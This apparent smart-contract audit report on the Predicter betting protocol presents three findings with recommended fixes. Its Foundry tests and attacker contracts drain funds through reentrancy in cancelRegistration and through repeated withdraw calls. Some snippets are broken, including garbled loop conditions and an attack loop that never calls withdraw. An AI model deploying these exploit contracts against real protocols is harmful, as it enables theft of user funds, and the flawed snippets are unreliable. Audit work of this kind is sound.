# [First Flight #20: The Predicter](https://codehawks.cyfrin.io/c/2024-07-the-predicter/) 

---

<details>

<summary> Findings </summary>

1. [`ThePredicter::cancelRegistration` is vulnerable to reentrancy](#h-1-thepredictercancelregistration-is-vulnerable-to-reentrancy)
2. [Not accounting for a possible score of 0 in `ThePredictor::withdraw` will lead to stuck funds](#m-1-not-accounting-for-a-possible-score-of-0-in-thepredictorwithdraw-will-lead-to-stuck-funds)
3. [Improper timestamp constraints in  `ScoreBoard::setPrediction` allows `ThePredictor::withdraw` to be called multiple times](#m-2-improper-timestamp-constraints-in--scoreboardsetprediction-allows-thepredictorwithdraw-to-be-called-multiple-times)

</details>

---


### [H-1] `ThePredicter::cancelRegistration` is vulnerable to reentrancy
#### Summary
Anyone can enter the protocol with `ThePredictor::register`. At this point, the user has a status of `Pending`. During the `Pending` phase, a user can be `Approved` by the organizer, or the user can exit the protocol using `ThePredicter::cancelRegistration`. If the user interacts with `cancelRegistration`, they have the opportunity to drain all funds with an attack contract.

#### Vulnerability Details
1. `ThePredicter::cancelRegistration` lacks reentry mitigation and it makes an external call to `msg.sender`
```js
function cancelRegistration() public {
	if (playersStatus[msg.sender] == Status.Pending) {
		(bool success, ) = msg.sender.call{value: entranceFee}("");
		require(success, "Failed to withdraw");
		playersStatus[msg.sender] = Status.Canceled;
		return;
	}
	revert ThePredicter__NotEligibleForWithdraw();
}
```
2. The user enters the protocol as a malicious contract...  `msg.sender` will call `cancelRegistration` whenever it receives ether
```js
receive() external payable {
	while (address(thePredicter).balance >= 0.04 ether) {
		thePredicter.cancelRegistration();
	}
}
```


<details>

<summary> Proof of Concept (attack contract)</summary>
1. The malicious user will become the owner of this contract on deployment. 
2. This contract will enter the protocol as a player.
3. This contract will call `cancelRegistration` initiating the reentrancy loop

```js
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface IThePredicter {
    function cancelRegistration() external;
}

contract CancelReenter {

    address private immutable owner;
    IThePredicter thePredicter;

    modifier onlyOwner() {
        if (msg.sender != owner) {
            revert();
        }
        _;
    }

    constructor(address _thePredicter) {
        owner = msg.sender;
        thePredicter = IThePredicter(_thePredicter);
    }

    function attack() public onlyOwner {
        thePredicter.cancelRegistration();
    }

    function withdraw() public onlyOwner {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        if (!success) {
            revert();
        }
    }

    receive() external payable {
        while (address(thePredicter).balance >= 0.04 ether) {
            thePredicter.cancelRegistration();
        }
    }
}
```
</details>

<details>

<summary> Proof of Concept (foundry test)</summary>

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {ThePredicter} from "../../src/ThePredicter.sol";
import {ScoreBoard} from "../../src/ScoreBoard.sol";
import {CancelReenter} from "../../src/attack/Attack.sol";

contract ThePredicterTest is Test {
    ThePredicter public thePredicter;
    ScoreBoard public scoreBoard;
    CancelReenter public attack;

    address public organizer = makeAddr("organizer");
    address public stranger = makeAddr("stranger");

    uint256 public constant PICK_A_NUMBER = 16;
    address[] trusted = new address[](PICK_A_NUMBER);

    function setUp() public {
        vm.startPrank(organizer);
        scoreBoard = new ScoreBoard();
        thePredicter = new ThePredicter(
            address(scoreBoard),
            0.04 ether,
            0.0001 ether
        );
        scoreBoard.setThePredicter(address(thePredicter));
        vm.stopPrank();

        vm.startPrank(stranger);
        attack = new CancelReenter(address(thePredicter));
        vm.deal(address(attack), 1 ether);
        vm.stopPrank();
    }

    modifier participants() {
        for (uint256 i =0; i<< PICK_A_NUMBER_; i++) {
            string memory stringNumber = vm.toString(i);
            trusted[i] = makeAddr(stringNumber);
            vm.deal(trusted[i], 1 ether);
            vm.startPrank(trusted[i]);
            thePredicter.register{value: 0.04 ether}();
            vm.stopPrank();
        }
        _;
    }

    function test_Reenter() public participants{
        vm.startPrank(address(attack));
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        assertEq(address(thePredicter).balance, 0.68 ether);

        vm.startPrank(stranger);
        attack.attack();
        vm.stopPrank();

        assertEq(address(thePredicter).balance, 0 ether);
    }
}
```
</details>

#### Impact
This is a high impact vulnerability that can drain the protocol of all its funds. Any of the non 'trusted' participants can perform this attack. The smart contract does not need to perform any calculations and only needs to call `cancelRegistration` repeatedly until all funds are drained. 

#### Tools Used
Manual Review
Foundry

#### Recommendations
There are a few courses of action that can help mitigate reentrancy
1. Update state (CEI pattern) before making an external call
```diff
function cancelRegistration() public {
	if (playersStatus[msg.sender] == Status.Pending) {
+       playersStatus[msg.sender] = Status.Canceled;
		(bool success, ) = msg.sender.call{value: entranceFee}("");
		require(success, "Failed to withdraw");
-		playersStatus[msg.sender] = Status.Canceled;
		return;
	}
	revert ThePredicter__NotEligibleForWithdraw();
}
```
2. Consider using OpenZeppelin's [ReentrancyGuard](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol)
3. Adjust `ThePredicter::register` so contracts can't enter the protocol
```diff
function register() public payable {
+   uint256 size;
+	address caller = msg.sender;     
+	assembly {        
+		size := extcodesize(caller)    
+	}    
+	if (size != 0) {
+		revert ThePredicter__NoContractsAllowed;
+	}

	if (msg.value != entranceFee) {
		revert ThePredicter__IncorrectEntranceFee();
	}

	if (block.timestamp > START_TIME - 14400) {
		revert ThePredicter__RegistrationIsOver();
	}

	if (playersStatus[msg.sender] == Status.Pending) {
		revert ThePredicter__CannotParticipateTwice();
	}

	playersStatus[msg.sender] = Status.Pending;
}
```



### [M-1] Not accounting for a possible score of 0 in `ThePredictor::withdraw` will lead to stuck funds
#### Summary
The protocol makes the assumption that players will either have a positive or negative score when performing calculations in `ThePredicter::withdraw`. Specifically, this if check assigns a value to `withdraw::reward` :
```js
reward = maxScore < 0
	? entranceFee
	: (shares * players.length * entranceFee) / totalShares;
```
The check assumes that `maxScore` will either be less than or greater than 0. In a situation where all players end up with a score of 0, withdraw will return a `[FAIL. Reason: panic: division or modulo by zero (0x12)]` error due to `totalShares == 0`. 
Considering users should have their `entranceFee` returned if `maxScore < 0`, we can assume the intentions would be the same if `maxScrore == 0`. Not accounting for `maxScore == 0` will result in funds being stuck in the contract.

#### Vulnerability Details
In order for a player to be eligible for withdraw, they must pass this check:
```js
if (!scoreBoard.isEligibleForReward(msg.sender))
```

`ScoreBoard::isEligibleForReward` requires that a player make at least 1 prediction:
```js
function isEligibleForReward(address player) public view returns (bool) {
	return
		results[NUM_MATCHES - 1] != Result.Pending &&
		playersPredictions[player].predictionsCount > 1;
}
```

In `Predicter::withdraw`, a user's payout is determined by `uint256 totalShares = uint256(totalPositivePoints);`. The calculation is made in a for loop checking each players score
```js
for (uint256 i = 0; i < players.length; ++i) {
	int8 cScore = scoreBoard.getPlayerScore(players[i]);
	if (cScore > maxScore) maxScore = cScore;
	if (cScore > 0) totalPositivePoints += cScore;
}
```

`ScoreBoard::getPlayerScore` will either return `2` or `-1`:
```js
score += playersPredictions[player].predictions[i] == results[i]
	? int8(2)
	: -1;
```

This allows for `withdraw::totalPositivePoints` to equal 0. In those situations, `withdraw` will return a panic error. 

<details>

<summary> Proof of Concept (foundry test)</summary>
1. A max number of participants enter the protocol
2. Each participant predicts one match correctly and two incorrectly leading to a score of 0 for all players
3. `test_NormalWithdraw` will attempt to withdraw but result in a panic error

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {ThePredicter} from "../src/ThePredicter.sol";
import {ScoreBoard} from "../src/ScoreBoard.sol";

contract ThePredicterTest is Test {
    ThePredicter public thePredicter;
    ScoreBoard public scoreBoard;
    address public organizer = makeAddr("organizer");
    address public stranger = makeAddr("stranger");

    uint256 public constant PICK_A_NUMBER = 30;
    address[] players = new address[](PICK_A_NUMBER);

    function setUp() public {
        vm.startPrank(organizer);
        scoreBoard = new ScoreBoard();
        thePredicter = new ThePredicter(
            address(scoreBoard),
            0.04 ether,
            0.0001 ether
        );

        scoreBoard.setThePredicter(address(thePredicter));
        vm.stopPrank();
    }

    modifier participants() {
        for (uint256 i =0; i<< PICK_A_NUMBER; i++) {
            string memory stringNumber = vm.toString(i);
            players[i] = makeAddr(stringNumber);
            vm.deal(players[i], 1 ether);
            vm.startPrank(players[i]);
            thePredicter.register{value: 0.04 ether}();
            vm.stopPrank();

            vm.startPrank(organizer);
            thePredicter.approvePlayer(players[i]);
            vm.stopPrank();

            vm.startPrank(players[i]);
            thePredicter.makePrediction{value: 0.0001 ether}(
                1,
                ScoreBoard.Result.First
            );
            thePredicter.makePrediction{value: 0.0001 ether}(
                2,
                ScoreBoard.Result.Second
            );
            thePredicter.makePrediction{value: 0.0001 ether}(
                3,
                ScoreBoard.Result.Second
            );
        }

        vm.startPrank(organizer);
        scoreBoard.setResult(0, ScoreBoard.Result.First);
        scoreBoard.setResult(1, ScoreBoard.Result.First);
        scoreBoard.setResult(2, ScoreBoard.Result.First);
        scoreBoard.setResult(3, ScoreBoard.Result.First);
        scoreBoard.setResult(4, ScoreBoard.Result.First);
        scoreBoard.setResult(5, ScoreBoard.Result.First);
        scoreBoard.setResult(6, ScoreBoard.Result.First);
        scoreBoard.setResult(7, ScoreBoard.Result.First);
        scoreBoard.setResult(8, ScoreBoard.Result.First);
        vm.stopPrank();
        _;
    }

	function test_NormalWithdraw() public participants{
		vm.startPrank(address(players[1]));
		thePredicter.withdraw();
		vm.stopPrank();
		assertEq(players[1].balance, 0.9997 ether);
	}
    }
   ```



</details>

#### Impact
This is a high impact vulnerability. It can occur if no one gets any predictions correct or if the sum of predictions scores equals zero. The odds of this occurring will depend on how many players enter the protocol, how frequently the players will make predictions (as they are not obligated to predict every match), and the precision of their predictions.  The vulnerability will lead to a loss of all funds except for the (incorrectly calculated) prediction fees. 

#### Tools Used
Manual Review
Foundry

#### Recommendations
We need to adjust the logic in `Predicter::withdraw`
One fix would be to include 0 for `maxScore`:
```diff
+ reward = maxScrore <= 0
- reward = maxScore < 0
		? entranceFee
		: (shares * players.length * entranceFee) / totalShares;
```
Or account for `totalShares` being 0:
```diff
+ if (totalShares == 0) {
+	 reward = entranceFee;
+ } else {
+	reward = maxScore < 0
+	 ? entranceFee
+	 : (shares * players.length * entranceFee) / totalShares;
+ }
- reward = maxScore < 0
-		? entranceFee
-		: (shares * players.length * entranceFee) / totalShares;
```

### [M-2] Improper timestamp constraints in  `ScoreBoard::setPrediction` allows `ThePredictor::withdraw` to be called multiple times
#### Summary
After a user calls `ThePredictor::withdraw`, the user should receive their ether reward. They should not be able to call withdraw again. The user not being able to call `withdraw` again is meant to be handled by this external call:
```js
scoreBoard.clearPredictionsCount(msg.sender);
```
Before funds are distributed to the user `ScoreBoard::clearPredictionsCount` reduces the player's `predictionsCount` to 0. In order for a user to be able to call withdraw, they need to pass this check which requires a prediction count > 0:
```js
if (!scoreBoard.isEligibleForReward(msg.sender))
```
The malicious user is able to bypass this precaution by calling `ScoreBoard::setPrediction`. After making this call, the user can call `withdraw` and repeat this process until funds are drained from the contract.

#### Vulnerability Details
1. The malicious user has made some predictions and is eligible to receive ether from `ThePredicter::withdraw`
2. All users are able to call `ThePredicter::withdraw` after the `organizer` has called `ScoreBoard::setResult` for all matches
3. After calling `withdraw`, the malicious user calls `ScoreBoard::setPrediction` enabling them to call `withdraw` again
4. The malicious user can repeat this process and receive ether from the contract until the contract can no longer disburse the `withdraw::reward` amount 

Users are meant to interact with `ThePredciter::makePrediction`. This function has an important check 
```js
if (block.timestamp > START_TIME + matchNumber * 68400 - 68400) {
	revert ThePredicter__PredictionsAreClosed();
}
```
and makes external calls to the `ScoreBoard` contract:
```js
scoreBoard.confirmPredictionPayment(msg.sender, matchNumber);
scoreBoard.setPrediction(msg.sender, matchNumber, prediction);
```

The user should only be able to make a prediction for a certain game at a certain time before the game. The user's information is passed on to the `ScoreBoard` contract

An external call is made to `ScoreBoard::setPrediction`. This is a public function that the user can call with arbitrary parameters whenever they want. It is meant to be used to update previous predictions without having to pay a `predictionFee`. This check inside the function does not prevent function execution, it will only skip this particular block of code if time constraints are not met:
```js
if (block.timestamp <= START_TIME + matchNumber * 68400 - 68400)
playersPredictions[player].predictions[matchNumber] = result;
```

The rest of the function will execute regardless of the above timestamp check:
```js
playersPredictions[player].predictionsCount = 0;
for (uint256 i = 0; i < NUM_MATCHES; ++i) {
	if (
		playersPredictions[player].predictions[i] != Result.Pending &&
		playersPredictions[player].isPaid[i]
	) ++playersPredictions[player].predictionsCount;
}
```
Even though `ThePredicter::withdraw` uses `scoreBoard.clearPredictionsCount(msg.sender);` to clear the user's `predictionsCount`, the user can call `ScoreBoard::setPrediction` with arbitrary parameters to restore their prediction count. With the `predctionsCount` restored, the user can bypass the initial `if (!scoreBoard.isEligibleForReward(msg.sender))` check in `ThePredicter::withdraw` allowing them to repeat the process as many times as needed to extract the maximum amount from the contract  

<details>

<summary> Proof of Concept (foundry test)</summary>
This test can be added to the provided test suite
1. Three participants enter the protocol
2. All three participants are eligible to receive 0.04 ether
3. `stranger3` is able to take all the funds by calling `setPrediction`

```js
function test_MultipleWithdrawCalls() public {
        address stranger2 = makeAddr("stranger2");
        address stranger3 = makeAddr("stranger3");

        vm.startPrank(stranger);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger2);
        vm.deal(stranger2, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();
        
        vm.startPrank(stranger3);
        vm.deal(stranger3, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.approvePlayer(stranger);
        thePredicter.approvePlayer(stranger2);
        thePredicter.approvePlayer(stranger3);
        vm.stopPrank();

        vm.startPrank(stranger);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.First
        );

        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.First
        );
        vm.stopPrank();

        vm.startPrank(stranger2);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.First
        );
        vm.stopPrank();

        vm.startPrank(stranger3);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.First
        );
        vm.stopPrank();

        vm.startPrank(organizer);
        scoreBoard.setResult(0, ScoreBoard.Result.First);
        scoreBoard.setResult(1, ScoreBoard.Result.First);
        scoreBoard.setResult(2, ScoreBoard.Result.First);
        scoreBoard.setResult(3, ScoreBoard.Result.First);
        scoreBoard.setResult(4, ScoreBoard.Result.First);
        scoreBoard.setResult(5, ScoreBoard.Result.First);
        scoreBoard.setResult(6, ScoreBoard.Result.First);
        scoreBoard.setResult(7, ScoreBoard.Result.First);
        scoreBoard.setResult(8, ScoreBoard.Result.First);
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.withdrawPredictionFees();
        vm.stopPrank();

        vm.startPrank(stranger3);
        thePredicter.withdraw();
        scoreBoard.setPrediction(address(stranger3),1,ScoreBoard.Result.First);
        thePredicter.withdraw();
        scoreBoard.setPrediction(address(stranger3),1,ScoreBoard.Result.First);
        thePredicter.withdraw();
        vm.stopPrank();
        assertEq(stranger3.balance, 1.0797 ether);

        assertEq(address(thePredicter).balance, 0 ether);
    }
   ```
</details>

<details>

<summary> Proof of Concept (attack contract)</summary>
The user could also use an attack contract to programmatically exploit the contract as opposed to making manual calls of `ScoreBoard::setPrediction` 

```js
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

enum Result {
	Pending,
	First,
	Draw,
	Second
}

interface IScoreBoard {
    function setPrediction(address, uint256, Result) external;
}

interface IThePredicter {
    function withdraw() external;
}

contract ScoreBoardAttack {
    address private immutable owner;
    IScoreBoard scoreBoard;
    IThePredicter thePredicter;

    modifier onlyOwner() {
        if (msg.sender != owner) {
            revert();
        }
        _;
    }

    constructor(address _scoreBoard, address _thePredicter) {
        owner = msg.sender;
        scoreBoard = IScoreBoard(_scoreBoard);
        thePredicter = IThePredicter(_thePredicter);
    }

    function attack() public onlyOwner {
        thePredicter.withdraw();
    }

    function withdraw() public onlyOwner {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        if (!success) {
            revert();
        }
    }

    receive() external payable {
        while (address(thePredicter).balance >= 0.01 ether) {
            scoreBoard.setPrediction(address(this),1,Result.First);
        }
    }
}
   ```
</details>

#### Impact
This is a high impact vulnerability. While `ScoreBoard::setPrediction` is meant to be public so users can make adjustments to predictions without paying fees, it lacks the same timestamp check as `ThePredicter::withdraw`. Because of this inconsistency, users can still call this function when they should not be able to. This allows a user to potentially drain the contract by calling withdraw multiple times. 
#### Tools Used
Manual Review
Foundry

#### Recommendations
Use a similar if check found in `ThePredicter::withdraw` with `ScoreBoard::setPrediction`:
```diff
+ if (block.timestamp > START_TIME + matchNumber * 68400 - 68400) {
+	revert ThePredicter__PredictionsAreClosed();
+ }
- if (block.timestamp <= START_TIME + matchNumber * 68400 - 68400)
playersPredictions[player].predictions[matchNumber] = result;
```
